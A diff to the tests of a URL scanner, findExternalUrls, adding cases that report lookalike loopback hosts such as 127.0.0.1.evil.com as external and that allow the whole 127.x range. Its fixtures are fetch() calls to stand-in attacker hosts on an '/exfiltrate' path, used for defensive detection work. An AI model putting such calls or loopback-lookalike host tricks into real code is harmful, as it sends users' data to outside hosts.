@@ -94,6 +94,26 @@ describe('findExternalUrls', () => {
     ]);
   });
 
+  it('reports a host that merely begins with the loopback range, which a prefix test let through', () => {
+    const js = [
+      'fetch("http://127.0.0.1.evil.com/exfiltrate")',
+      'fetch("http://127.evil.com/exfiltrate")',
+      'fetch("http://127.999.1.1/exfiltrate")',
+    ].join('\n');
+
+    expect(findExternalUrls(js)).toStrictEqual([
+      'http://127.0.0.1.evil.com/exfiltrate',
+      'http://127.evil.com/exfiltrate',
+      'http://127.999.1.1/exfiltrate',
+    ]);
+  });
+
+  it('allows every address in the loopback range, not only 127.0.0.1', () => {
+    const js = 'fetch("http://127.255.255.255:5556/api")';
+
+    expect(findExternalUrls(js)).toStrictEqual([]);
+  });
+
   it('ignores a URL with no literal host at all, which is how zod hands an address to the URL parser', () => {
     const js =
       'new URL(`http://[${address}]`); new URL(`https://${host}:${port}/x`)';
